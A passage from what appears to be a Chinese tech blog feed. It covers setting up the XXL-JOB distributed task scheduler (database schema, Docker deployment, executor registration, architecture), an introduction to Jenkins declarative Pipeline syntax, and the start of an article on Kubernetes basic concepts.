&#x27;上次调度时间&#x27;,<br>  `trigger_next_time` bigint(13) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;下次调度时间&#x27;,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_log` (<br>  `id` bigint(20) NOT NULL AUTO_INCREMENT,<br>  `job_group` int(11) NOT NULL COMMENT &#x27;执行器主键ID&#x27;,<br>  `job_id` int(11) NOT NULL COMMENT &#x27;任务，主键ID&#x27;,<br>  `executor_address` varchar(255) DEFAULT NULL COMMENT &#x27;执行器地址，本次执行的地址&#x27;,<br>  `executor_handler` varchar(255) DEFAULT NULL COMMENT &#x27;执行器任务handler&#x27;,<br>  `executor_param` varchar(512) DEFAULT NULL COMMENT &#x27;执行器任务参数&#x27;,<br>  `executor_sharding_param` varchar(20) DEFAULT NULL COMMENT &#x27;执行器任务分片参数，格式如 1/2&#x27;,<br>  `executor_fail_retry_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;失败重试次数&#x27;,<br>  `trigger_time` datetime DEFAULT NULL COMMENT &#x27;调度-时间&#x27;,<br>  `trigger_code` int(11) NOT NULL COMMENT &#x27;调度-结果&#x27;,<br>  `trigger_msg` text COMMENT &#x27;调度-日志&#x27;,<br>  `handle_time` datetime DEFAULT NULL COMMENT &#x27;执行-时间&#x27;,<br>  `handle_code` int(11) NOT NULL COMMENT &#x27;执行-状态&#x27;,<br>  `handle_msg` text COMMENT &#x27;执行-日志&#x27;,<br>  `alarm_status` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;告警状态：0-默认、1-无需告警、2-告警成功、3-告警失败&#x27;,<br>  PRIMARY KEY (`id`),<br>  KEY `I_trigger_time` (`trigger_time`),<br>  KEY `I_handle_code` (`handle_code`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_log_report` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `trigger_day` datetime DEFAULT NULL COMMENT &#x27;调度-时间&#x27;,<br>  `running_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;运行中-日志数量&#x27;,<br>  `suc_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;执行成功-日志数量&#x27;,<br>  `fail_count` int(11) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;执行失败-日志数量&#x27;,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`),<br>  UNIQUE KEY `i_trigger_day` (`trigger_day`) USING BTREE<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_logglue` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `job_id` int(11) NOT NULL COMMENT &#x27;任务，主键ID&#x27;,<br>  `glue_type` varchar(50) DEFAULT NULL COMMENT &#x27;GLUE类型&#x27;,<br>  `glue_source` mediumtext COMMENT &#x27;GLUE源代码&#x27;,<br>  `glue_remark` varchar(128) NOT NULL COMMENT &#x27;GLUE备注&#x27;,<br>  `add_time` datetime DEFAULT NULL,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_registry` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `registry_group` varchar(50) NOT NULL,<br>  `registry_key` varchar(255) NOT NULL,<br>  `registry_value` varchar(255) NOT NULL,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`),<br>  KEY `i_g_k_v` (`registry_group`,`registry_key`,`registry_value`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_group` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `app_name` varchar(64) NOT NULL COMMENT &#x27;执行器AppName&#x27;,<br>  `title` varchar(12) NOT NULL COMMENT &#x27;执行器名称&#x27;,<br>  `address_type` tinyint(4) NOT NULL DEFAULT &#x27;0&#x27; COMMENT &#x27;执行器地址类型：0=自动注册、1=手动录入&#x27;,<br>  `address_list` text COMMENT &#x27;执行器地址列表，多地址逗号分隔&#x27;,<br>  `update_time` datetime DEFAULT NULL,<br>  PRIMARY KEY (`id`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_user` (<br>  `id` int(11) NOT NULL AUTO_INCREMENT,<br>  `username` varchar(50) NOT NULL COMMENT &#x27;账号&#x27;,<br>  `password` varchar(50) NOT NULL COMMENT &#x27;密码&#x27;,<br>  `role` tinyint(4) NOT NULL COMMENT &#x27;角色：0-普通用户、1-管理员&#x27;,<br>  `permission` varchar(255) DEFAULT NULL COMMENT &#x27;权限：执行器ID列表，多个逗号分割&#x27;,<br>  PRIMARY KEY (`id`),<br>  UNIQUE KEY `i_username` (`username`) USING BTREE<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>CREATE TABLE `xxl_job_lock` (<br>  `lock_name` varchar(50) NOT NULL COMMENT &#x27;锁名称&#x27;,<br>  PRIMARY KEY (`lock_name`)<br>) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;<br><br>INSERT INTO `xxl_job_group`(`id`, `app_name`, `title`, `address_type`, `address_list`, `update_time`) VALUES (1, &#x27;xxl-job-executor-sample&#x27;, &#x27;示例执行器&#x27;, 0, NULL, &#x27;2018-11-03 22:21:31&#x27; );<br>INSERT INTO `xxl_job_info`(`id`, `job_group`, `job_desc`, `add_time`, `update_time`, `author`, `alarm_email`, `schedule_type`, `schedule_conf`, `misfire_strategy`, `executor_route_strategy`, `executor_handler`, `executor_param`, `executor_block_strategy`, `executor_timeout`, `executor_fail_retry_count`, `glue_type`, `glue_source`, `glue_remark`, `glue_updatetime`, `child_jobid`) VALUES (1, 1, &#x27;测试任务1&#x27;, &#x27;2018-11-03 22:21:31&#x27;, &#x27;2018-11-03 22:21:31&#x27;, &#x27;XXL&#x27;, &#x27;&#x27;, &#x27;CRON&#x27;, &#x27;0 0 0 * * ? *&#x27;, &#x27;DO_NOTHING&#x27;, &#x27;FIRST&#x27;, &#x27;demoJobHandler&#x27;, &#x27;&#x27;, &#x27;SERIAL_EXECUTION&#x27;, 0, 0, &#x27;BEAN&#x27;, &#x27;&#x27;, &#x27;GLUE代码初始化&#x27;, &#x27;2018-11-03 22:21:31&#x27;, &#x27;&#x27;);<br>INSERT INTO `xxl_job_user`(`id`, `username`, `password`, `role`, `permission`) VALUES (1, &#x27;admin&#x27;, &#x27;e10adc3949ba59abbe56e057f20f883e&#x27;, 1, NULL);<br>INSERT INTO `xxl_job_lock` ( `lock_name`) VALUES ( &#x27;schedule_lock&#x27;);<br><br>commit;<br><br></code></pre></td></tr></table></figure><h2 id="3-2-docker-部署-XXL-JOB-admin"><a href="#3-2-docker-部署-XXL-JOB-admin" class="headerlink" title="3.2 docker 部署 XXL-JOB admin"></a>3.2 docker 部署 XXL-JOB admin</h2><p>创建 <code>xxl_job</code> 目录，在目录下编辑<code>docker-compose.yml</code> 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /opt/docker/xxl_job &amp;&amp; <span class="hljs-built_in">cd</span> /opt/docker/xxl_job<br>vim docker-compose.yml<br></code></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">version:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attr">services:</span><br>    <span class="hljs-attr">xxljob:</span><br>        <span class="hljs-attr">image:</span> <span class="hljs-string">xuxueli/xxl-job-admin:2.3.0</span>        <br>        <span class="hljs-attr">container_name:</span> <span class="hljs-string">xxl-job</span><br>        <span class="hljs-attr">ports:</span> <br>            <span class="hljs-bullet">-</span> <span class="hljs-number">8222</span><span class="hljs-string">:8080</span> <span class="hljs-comment">## 这个是调度平台端口</span><br>        <span class="hljs-attr">volumes:</span><br>            <span class="hljs-bullet">-</span> <span class="hljs-string">./data/log:/data/applogs</span><br>        <span class="hljs-attr">environment:</span><br>            <span class="hljs-attr">PARAMS:</span> <span class="hljs-string">&quot;--spring.datasource.url=jdbc:mysql://13.132.81.22:3660/xxl_job?serverTimezone=UTC&amp;characterEncoding=utf8&amp;useUnicode=true </span><br><span class="hljs-string">                     --spring.datasource.username=root </span><br><span class="hljs-string">                     --spring.datasource.password=root</span><br><span class="hljs-string">                     --spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver&quot;</span><br></code></pre></td></tr></table></figure><p> 执行命令启动 <code>xxljob</code> 容器，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker-compose up -d xxljob<br></code></pre></td></tr></table></figure><p>浏览器访问 <code>http://IP:8222/xxl-job-admin/toLogin</code> ，使用 <code>admin/123456</code> 登录；</p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/1661327886963.png" alt="1661327886963"></p><p>登陆成功记得修改密码，至此平台客户端搭建完成。</p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/1661328037386.png" alt="1661328037386"></p><h2 id="3-3-往调度中心注册执行器"><a href="#3-3-往调度中心注册执行器" class="headerlink" title="3.3 往调度中心注册执行器"></a>3.3 往调度中心注册执行器</h2><p>部署了调度中心之后，需要往调度中心注册执行器，添加调度任务。接下来就参考<code>xxl-job</code>示例写一个简单的例子。 </p><p>首先，拉取 <code>xxl-job</code> 源码到本地：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@gitee.com:xuxueli0323/xxl-job.git<br></code></pre></td></tr></table></figure><p> 拉取源码下来后，可以看到项目结构，如下： </p><p> <img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661328810354.png" alt="图片"> </p><p> 导入到IDEA，配置一下Maven，下载相关的jar包，稍等一下后，就可以看到这样的项目： </p><p> <img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661328824901.png" alt="图片"> </p><p>我们直接使用 <code>xxl-job-executor-samples</code> 作为我们的执行器项目，修改 <code>application.properties</code>，主要需要修改调度中心地址、执行器名称、日志路径等：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># web port</span><br><span class="hljs-attr">server.port</span>=<span class="hljs-string">8081</span><br><span class="hljs-comment"># log config</span><br><span class="hljs-attr">logging.config</span>=<span class="hljs-string">classpath:logback.xml</span><br><span class="hljs-attr">spring.application.name</span>=<span class="hljs-string">xxljob-demo</span><br><span class="hljs-comment">### 调度中心部署跟地址 [选填]：如调度中心集群部署存在多个地址则用逗号分隔。执行器将会使用该地址进行&quot;执行器心跳注册&quot;和&quot;任务结果回调&quot;；为空则关闭自动注册；</span><br><span class="hljs-attr">xxl.job.admin.addresses</span>=<span class="hljs-string">http://127.0.0.1:8080/xxl-job-admin</span><br><span class="hljs-comment">### 执行器通讯TOKEN [选填]：非空时启用；</span><br><span class="hljs-attr">xxl.job.accessToken</span>=<span class="hljs-string"></span><br><span class="hljs-comment">### 执行器AppName [选填]：执行器心跳注册分组依据；为空则关闭自动注册</span><br><span class="hljs-attr">xxl.job.executor.appname</span>=<span class="hljs-string">xxl-job-demo</span><br><span class="hljs-comment">### 执行器注册 [选填]：优先使用该配置作为注册地址，为空时使用内嵌服务 ”IP:PORT“ 作为注册地址。从而更灵活的支持容器类型执行器动态IP和动态映射端口问题。</span><br><span class="hljs-attr">xxl.job.executor.address</span>=<span class="hljs-string"></span><br><span class="hljs-comment">### 执行器IP [选填]：默认为空表示自动获取IP，多网卡时可手动设置指定IP，该IP不会绑定Host仅作为通讯实用；地址信息用于 &quot;执行器注册&quot; 和 &quot;调度中心请求并触发任务&quot;；</span><br><span class="hljs-attr">xxl.job.executor.ip</span>=<span class="hljs-string"></span><br><span class="hljs-comment">### 执行器端口号 [选填]：小于等于0则自动获取；默认端口为9999，单机部署多个执行器时，注意要配置不同执行器端口；</span><br><span class="hljs-attr">xxl.job.executor.port</span>=<span class="hljs-string">9999</span><br><span class="hljs-comment">### 执行器运行日志文件存储磁盘路径 [选填] ：需要对该路径拥有读写权限；为空则使用默认路径；</span><br><span class="hljs-attr">xxl.job.executor.logpath</span>=<span class="hljs-string">/data/applogs/xxl-job/jobhandler</span><br><span class="hljs-comment">### 执行器日志文件保存天数 [选填] ：过期日志自动清理, 限制值大于等于3时生效; 否则, 如-1, 关闭自动清理功能；</span><br><span class="hljs-attr">xxl.job.executor.logretentiondays</span>=<span class="hljs-string">10</span><br></code></pre></td></tr></table></figure><p> 接着编写一个任务类<code>SampleXxlJob</code>，使用Bean模式 ；</p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/1661330651080.png" alt="1661330651080"></p><h3 id="添加执行器"><a href="#添加执行器" class="headerlink" title="添加执行器"></a>添加执行器</h3><p>接着启动执行器服务，打开调度中心界面， 添加执行器；</p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332453889.png" alt="图片"> </p><p> <img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332512848.png" alt="图片"> </p><h3 id="添加任务"><a href="#添加任务" class="headerlink" title="添加任务"></a>添加任务</h3><p>接着到任务管理，选择添加的执行器后，添加任务；</p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332496223.png" alt="图片"> </p><h3 id="执行任务"><a href="#执行任务" class="headerlink" title="执行任务"></a>执行任务</h3><p>最后我们可以到任务管理去测试一下，运行<code>demoJobHandler</code> ：</p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332535521.png" alt="图片"> </p><p> <img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332545203.png" alt="图片"> </p><p>点击保存后，会立即执行。</p><h3 id="日志查看"><a href="#日志查看" class="headerlink" title="日志查看"></a>日志查看</h3><p>点击查看日志，可以看到任务执行的历史日志记录 </p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332660714.png" alt="图片"> </p><p> 打开刚刚执行的执行日志，我们可以看到，运行成功。 </p><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661332678112.png" alt="图片"> </p><h1 id="四、架构设计与工作原理"><a href="#四、架构设计与工作原理" class="headerlink" title="四、架构设计与工作原理"></a>四、架构设计与工作原理</h1><h2 id="4-1-架构设计"><a href="#4-1-架构设计" class="headerlink" title="4.1 架构设计"></a>4.1 架构设计</h2><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661334649441.png" alt="图片"> </p><p>从架构图可以看出，分别有调度中心和执行器两大组成部分</p><ul><li><em><strong>调度中心</strong></em>。负责<strong>管理调度信息</strong>，按照调度配置发出调度请求，自身不承担业务代码。支持可视化界面，可以在调度中心对任务进行新增，更新，删除，会实时生效。支持监控调度结果，查看执行日志，查看调度任务统计报表，任务失败告警等等。</li><li><em><strong>执行器</strong></em>。负责接收调度请求，执行调度任务的业务逻辑。执行器启动后需要注册到调度中心。接收调度中心的发出的执行请求，终止请求，日志请求等等。</li></ul><h2 id="4-2-工作原理"><a href="#4-2-工作原理" class="headerlink" title="4.2 工作原理"></a>4.2 工作原理</h2><p><img src="/../blog-assets/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB/640-1661334847528.png" alt="图片"> </p><ol><li>任务执行器根据配置的调度中心的地址，自动注册到调度中心；</li><li>达到任务触发条件，调度中心下发任务；</li><li>执行器基于线程池执行任务，并把执行结果放入内存队列中、把执行日志写入日志文件中；</li><li>执行器的回调线程消费内存队列中的执行结果，主动上报给调度中心；</li><li>当用户在调度中心查看任务日志，调度中心请求任务执行器，任务执行器读取任务日志文件并返回日志详情。</li></ol>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Jenkins 进阶（一）Pipeline</title>
    <link href="/2022/08/12/Jenkins%E8%BF%9B%E9%98%B6pipeline/"/>
    <url>/2022/08/12/Jenkins%E8%BF%9B%E9%98%B6pipeline/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Pipeline-介绍"><a href="#一、Pipeline-介绍" class="headerlink" title="一、Pipeline 介绍"></a>一、Pipeline 介绍</h1><p><code>jenkins 2.x</code> 开始流行<code>pipeline</code>（<code>groovy</code>语言编写）的写法，目的是通过以代码的方式来进行<code>job</code>的构建，减少人工操作导致的人为出错。它是用于描述整条流水线是如何进行，流水线的内容一般包括执行编译、打包、测试、部署及告警通知等步骤。</p><h1 id="二、Pipeline-语法"><a href="#二、Pipeline-语法" class="headerlink" title="二、Pipeline 语法"></a>二、Pipeline 语法</h1><h2 id="1-声明式-Pipeline"><a href="#1-声明式-Pipeline" class="headerlink" title="1. 声明式 Pipeline"></a>1. 声明式 Pipeline</h2><p>完整<code>pipeline</code>流水线，由以下5部分组成，缺一不可，否则<code>jenkins</code>会报错</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs groovy">pipeline &#123;<br>    agent &#123; docker <span class="hljs-string">&#x27;maven:3.3.3&#x27;</span> &#125;<br>    stages &#123;<br>        stage(<span class="hljs-string">&#x27;build&#x27;</span>) &#123;<br>            steps &#123;<br>                sh <span class="hljs-string">&#x27;mvn --version&#x27;</span><br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>pipeline</code>: 代表整条流水线，包含整条流水线的逻辑；</li><li><code>agent</code> : <ul><li><code>any</code>：任意可用的执行器）；</li><li><code>none</code>：每个<code>stage</code>需指定相应的<code>agent</code>；</li><li><code>node</code>：指定节点；</li><li><code>docker</code>：指定容器；</li></ul></li><li><code>stages</code>：整个流水线的所有执行阶段，里面包含多个<code>stage</code>；</li><li><code>stage</code>：流水线中的某个阶段，如拉取代码，编译构建，部署等阶段；</li><li><code>steps</code>：代表阶段内需要执行的命令，如shell命令等。</li></ul><p> 除以上5个必要组成部分，还可以自定义选择以下配置：</p><ul><li><code>字符串变量</code>：通过 <code>def var=1</code> 定义，可以在 <code>pipeline</code> 中使用 <code>$var</code> 引用；</li><li><code>environment</code>：配置环境变量，可用于<code>step</code>中 ；</li><li><code>options</code>： 允许执行<code>pipeline</code>内置的专用选项，也可以使用由插件提供的，如<code>timeout</code>，<code>retry，timestamps</code>等 ；</li><li><code>parameters</code>：参数列表，如字符参数、布尔参数等；</li><li><code>trigger</code>：定义了触发<code>pipeline</code>的方式；</li><li><code>tools</code>：支持<code>maven</code>、<code>jdk</code>、<code>gradle</code>，需在<code>jenkins</code>全局配置中已经定义好</li><li><code>when</code>：代码逻辑；</li><li><code>script</code>：流控制，如<code>if</code>&#x2F;<code>else</code>；</li><li><code>post</code>：有<code>always</code>，<code>unstable</code>，<code>success</code>，<code>failure</code>，和 <code>changed</code>等多种情况，常用于构建完成或失败时的通知告警；</li></ul><p><code>Jenkins</code> 支持对声明式 <code>pipeline</code> 的语法正确性校验，且支持某个<code>stage</code>执行失败后通过修复错误可直接回到此stage步骤重新开始执行。</p><h2 id="2-代码生成工具"><a href="#2-代码生成工具" class="headerlink" title="2. 代码生成工具"></a>2. 代码生成工具</h2><p> 部分脚本语法可以使用<code>jenkins</code>中的<code>Pipeline Syntax</code>来生成 ，例如拉取代码操作， 通过代码生成器，可以快速生成需要的<code>pipeline</code>代码段： </p><p> <img src="/../blog-assets/Jenkins%E8%BF%9B%E9%98%B6pipeline/e90b1332ab8f44df9359326d70aa5e9e.png" alt="img"> </p><p>配置好版本库信息后，点击 “生成流水线脚本”，得到 <code>pipeline</code> 代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch: <span class="hljs-string">&#x27;release&#x27;</span>, credentialsId: <span class="hljs-string">&#x27;xxxx-xxx-xxxx&#x27;</span>, url: <span class="hljs-string">&#x27;http://123.1.2.3/DunkingCurry30/SpringbootDemo.git&#x27;</span><br></code></pre></td></tr></table></figure><h1 id="三、Pipeline-的实际运用"><a href="#三、Pipeline-的实际运用" class="headerlink" title="三、Pipeline 的实际运用"></a>三、Pipeline 的实际运用</h1><p>通常来说，一条完整<code>CI</code>流水线基本包含代码拉取、编译构建、代码测试及部署，以及部署成功&#x2F;失败后的通知推送：</p><p> <img src="/../blog-assets/Jenkins%E8%BF%9B%E9%98%B6pipeline/36e3d12fc85b4a4c85b3aa523f37222d.png" alt="img"> </p><p>接下来，我们用 <code>pipeline</code> 来实现这个流程。</p>]]></content>
    
    
    <categories>
      
      <category>DevOps</category>
      
      <category>基础知识</category>
      
      <category>Jenkins</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jenkins</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DevOps(四）云原生 Kubernetes 基本概念</title>
    <link href="/2022/08/10/Kubernetes%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    <url>/2022/08/10/Kubernetes%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="一、Kubernetes-简介"><a href="#一、Kubernetes-简介" class="headerlink" title="一、Kubernetes 简介"></a>一、Kubernetes 简介</h1><p><code>Kubernetes</code> 简称 <code>k8s</code>，是支持云原生部署的一个平台，起源于谷歌。谷歌早在十几年之前就对其应用，通过容器方式进行部署。 </p><p><code>k8s</code> 本质上就是用来简化微服务的开发和部署的，关注点包括<strong>自动修复</strong>和<strong>自动伸缩</strong>、<strong>调度和发布</strong>、调用链监控、配置管理、Metrics 监控、日志监控、弹性和容错、API 管理、服务安全等，<code>k8s</code> 将这些微服务的公共关注点以组件形式封装打包到 <code>k8s</code> 这个大平台中，让开发人员在开发微服务时专注于业务逻辑的实现，而不需要去特别关系微服务底层的这些公共关注点，大大简化了微服务应用的开发和部署，提高了开发效率。</p><h1 id="二、Kubernetes-架构"><a href="#二、Kubernetes-架构" class="headerlink" title="二、Kubernetes 架构"></a>二、Kubernetes 架构</h1><p> <code>k8s</code> 总体架构采用了经典的 <code>master slave</code> 架构模式，分 <code>master</code>节点和 <code>worker</code> 节点，节点可以是虚拟机也可以是物理机。 </p><p><img src="/../blog-assets/Kubernetes%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/1660114244864.png" alt="1660114244864"></p><p> <code>master</code> 节点由以下组件组成：</p><ul><li><strong>etcd</strong>：一种的分布式存储机制，底层采用 <code>Raft</code> 协议，<code>k8s</code> 集群的状态数据包括配置、节点等都存储于 <code>etcd</code> 中，它保存了整个集群的状态；</li><li><strong>API server</strong>：对外提供操作和获取 <code>k8s</code> 集群资源的的 API，是唯一操作 <code>etcd</code> 的组件，其他的组件包括管理员操作都是通过 <code>API server</code> 进行交互的，可以将它理解成 etcd 的 “代理人”；</li><li><strong>Scheduler</strong>：在 <code>k8s</code> 集群中做调动决策，负责资源的调度，按照预定的调度策略将 <code>Pod</code> 调度到相应的机器上；</li><li><strong>Controller Manager</strong>：相当于集群状态的协调者，观察着集群的实际状态，与 <code>etcd</code> 中的预期状态进行对比，如果不一致则对资源进行协调操作让实际状态和预期状态达到最终的一致，维护集群的状态，比如故障检测、自动扩展、滚动更新等。</li></ul><p> <code>worker</code> 节点由以下组件组成： </p><ul><li><strong>Controller Runtime</strong>：下载镜像和运行容器的组件，负责镜像管理以及 <code>Pod</code> 和容器的真正运行<a href="https://blog.csdn.net/u013533380/article/details/115682900">CRI</a>；</li><li><strong>Pod</strong>：<code>k8s</code> 中特有的一个概念，可以理解为对容器的包装，是 <code>k8s</code> 的基本调度单位，实际的容器时运行在 <code>Pod</code> 中的，一个节点可以启动一个或多个 <code>Pod</code>；</li><li><strong>kubelet</strong>：负责管理 <code>worker</code> 节点上的组件，与 <code>master</code> 节点上的 <code>API server</code> 节点进行交互，接受指令执行操作；</li><li><strong>kube-proxy</strong>：负责对 <code>Pod</code> 进行寻址和负载均衡。</li></ul><p>用户操作 <code>k8s</code> 集群一般是通过 <code>kubectl</code> 命令行工具或者 <code>dashboard</code>；<code>Pod</code> 之间进行通讯是通过集群内部的覆盖网络 <code>Overlay Network</code>，外部流量想要进入集群访问 <code>Pod</code> 则是通过负载均衡 <code>Load Balander</code> 设备进行。</p><h1 id="三、Kunbernetes-有哪些核心概念？"><a href="#三、Kunbernetes-有哪些核心概念？" class="headerlink" title="三、Kunbernetes 有哪些核心概念？"></a>三、Kunbernetes 有哪些核心概念？</h1><h2 id="1-集群-Cluster"><a href="#1-集群-Cluster" class="headerlink" title="1. 集群 Cluster"></a>1. 集群 Cluster</h2><p> 集群有多个节点组成且可以按需添加节点（物理机&#x2F;虚拟机），每一个节点都包含一定数量的 CPU 和内存 RAM。 </p><p> <img src="/../blog-assets/Kubernetes%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/dd84c9bb8ca8048826e7a829e7a90c76.png" alt="img"> </p><h2 id="2-容器-Container"><a href="#2-容器-Container" class="headerlink" title="2. 容器 Container"></a>2. 容器 Container</h2><p><code>k8s</code> 本身是一个容器调度平台，<strong>从宿主机操作系统来看，容器就是一个一个的进程。从容器内部来看容器就是一个操作系统</strong>，它有着自己的网络、CPU、文件系统等资源。 </p><h2 id="3-POD"><a href="#3-POD" class="headerlink" title="3. POD"></a>3. POD</h2><p><code>k8s</code> 也不是直接调度容器的，而是将其封装成了一个个 <code>POD</code>。<code>POD</code> 才是 <code>k8s</code> 的基本调度单位<strong>。</strong>每个 <code>POD</code> 中可以运行一个或多个容器，共享 <code>POD</code> 的文件系统、IP 和网络等资源，每一个 <code>POD</code> 只有一个 IP。 </p><p>那么有人会问，为什么要使用<code>POD</code>，为什么不能直接使用容器呢？ </p><p>使用<code>POD</code>，相当于一个逻辑主机 ，<code>POD</code>的存在主要是让几个紧密连接的几个容器之间共享资源，例如IP地址，共享存储等信息。 例如你运行一个程序，其中使用了<code>nginx</code>、<code>mysql</code>，那么可以将这两个容器运行在同一个<code>POD</code>中，对他们提供统一的调配能力。如果直接调度容器的话，那么几个容器可能运行在不同的主机上，这样就增加了系统的复杂性。 </p><p> <img src="/../blog-assets/Kubernetes%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/2c3d3c0338851ceae684c929131b6c73.png" alt="img"> </p><h2 id="4-副本集-ReplicaSet"><a href="#4-副本集-ReplicaSet" class="headerlink" title="4. 副本集 ReplicaSet"></a>4. 副本集 ReplicaSet</h2><p>一个应用发布时会发布多个 <code>POD</code> 实例，副本集可对应一个应用的一组 